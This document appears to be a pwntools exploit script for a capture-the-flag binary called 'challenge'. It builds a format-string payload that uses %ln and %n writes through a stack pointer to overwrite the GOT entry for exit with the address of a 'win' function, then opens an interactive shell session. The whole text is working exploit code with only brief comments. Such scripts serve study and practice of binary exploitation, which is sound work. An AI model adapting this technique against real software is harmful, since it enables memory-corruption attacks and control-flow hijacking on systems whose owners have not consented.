from pwn import *
context.binary = binary = ELF("./challenge", checksec = False)
p = process("./challenge")
got_exit_address = binary.got.exit
win_address = binary.symbols['win']
#RBP was found to be at position 20
#Address at RBP points to position 22

gotpad = got_exit_address - 18
winpad = win_address - got_exit_address

payload = b"%" + str(gotpad).encode() + b"c" #1 argument consumed
payload += b"%c"*18 #Consume 18 more arguments
payload += b"%ln" # Write got_exit_address in address pointed by RBP
payload += b"%" + str(winpad).encode() + b"c" #pad to make total numbers written = win_address
payload += b"%n" # Write win_address to overwrite GOT address

#same thing expanded
#payload = b"%4196902c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%ln%1838c%n"

p.clean()
p.sendline(payload)
p.interactive()
